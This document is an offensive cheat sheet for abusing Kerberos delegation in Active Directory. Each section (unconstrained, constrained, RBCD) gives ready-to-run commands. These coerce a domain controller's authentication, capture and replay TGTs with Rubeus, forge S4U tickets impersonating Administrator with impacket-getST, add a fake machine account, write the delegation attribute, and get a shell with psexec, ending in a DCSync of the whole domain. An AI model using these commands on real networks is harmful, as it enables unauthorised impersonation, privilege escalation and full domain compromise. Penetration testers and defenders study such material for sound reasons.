Kerberos Delegation Abuse - Cheat Sheet

Abuse Kerberos delegation (the feature that lets a service act on behalf of a
user) to impersonate high-value accounts - including Domain Admins - and gain
access to other machines as them. Three flavours: Unconstrained, Constrained,
and Resource-Based Constrained Delegation (RBCD).
Replace the placeholders (<...>) with your own values.


Step 0 - Enumerate delegation across the domain

From Kali with valid domain creds, find delegation-configured accounts:

    impacket-findDelegation <domain>/<user>:<password> -dc-ip <dc-ip>

Or with BloodHound: look for "Allowed To Delegate" / "Unconstrained" edges.
Or with nxc:

    nxc ldap <dc-ip> -u <user> -p <password> --find-delegation


=== UNCONSTRAINED DELEGATION ===
A machine/account can impersonate ANY user that authenticates to it, because
it caches their TGT. Compromise such a host, then coerce a DC to auth to it.

Step U1 - Identify unconstrained hosts (TRUSTED_FOR_DELEGATION flag set).

Step U2 - On the compromised unconstrained host, capture incoming TGTs:

    Rubeus.exe monitor /interval:5 /nowrap

Step U3 - Coerce a Domain Controller to authenticate to your host:

    impacket-printerbug <domain>/<user>:<password>@<dc-ip> <unconstrained-host-ip>
    # or Coercer / PetitPotam

Step U4 - The DC's machine-account TGT lands in Rubeus. Extract and use it:

    Rubeus.exe ptt /ticket:<base64-tgt>
    # DC$ TGT -> DCSync the whole domain


=== CONSTRAINED DELEGATION ===
An account may delegate only to specific SPNs (msDS-AllowedToDelegateTo).
If you control such an account, you can impersonate any user to those SPNs.

Step C1 - You compromised an account allowed to delegate to e.g. cifs/FILE01.

Step C2 - Request a ticket impersonating Administrator (S4U2Self + S4U2Proxy):

    impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator \
        <domain>/<svc-account>:<password> -dc-ip <dc-ip>

    # With a hash instead of a password:
    impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator \
        -hashes :<nt-hash> <domain>/<svc-account> -dc-ip <dc-ip>

Step C3 - Use the ccache ticket:

    export KRB5CCNAME=Administrator.ccache
    nxc smb <target-fqdn> --use-kcache
    impacket-psexec -k -no-pass <domain>/Administrator@<target-fqdn>

Note: with protocol transition off, you can often still pivot SPNs (e.g. swap
cifs/ for host/ or ldap/) to broaden access from one delegation right.


=== RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ===
Delegation is configured on the TARGET (msDS-AllowedToActOnBehalfOfOtherIdentity).
If you can write that attribute on a computer object, you own it.

Pre-req: you need an account with an SPN you control. If you have "Add
workstation" rights (default MachineAccountQuota=10), create one:

    impacket-addcomputer <domain>/<user>:<password> -dc-ip <dc-ip> \
        -computer-name FAKE01$ -computer-pass <newpass>

Step R1 - You have GenericWrite/GenericAll/WriteDACL over <target-computer>
(check BloodHound). Set RBCD so FAKE01$ can act on behalf of users to it:

    impacket-rbcd <domain>/<user>:<password> -dc-ip <dc-ip> \
        -delegate-from 'FAKE01$' -delegate-to '<target-computer>$' -action write

Step R2 - Request an impersonation ticket as Administrator to the target:

    impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator \
        '<domain>/FAKE01$:<newpass>' -dc-ip <dc-ip>

Step R3 - Use it:

    export KRB5CCNAME=Administrator.ccache
    impacket-psexec -k -no-pass <domain>/Administrator@<target-fqdn>


(optional) Fix clock skew - Kerberos fails if your clock differs from the DC:

    sudo ntpdate <dc-ip>      # or: sudo rdate -n <dc-ip>


Key idea: Kerberos delegation lets a service reuse a user's identity. Each
flavour hands you impersonation if you control the right object: own an
unconstrained host and coerce a DC, control a constrained account and abuse
S4U, or just write one attribute on a target for RBCD. The payoff is almost
always a ticket as Administrator on the target - often the whole domain.
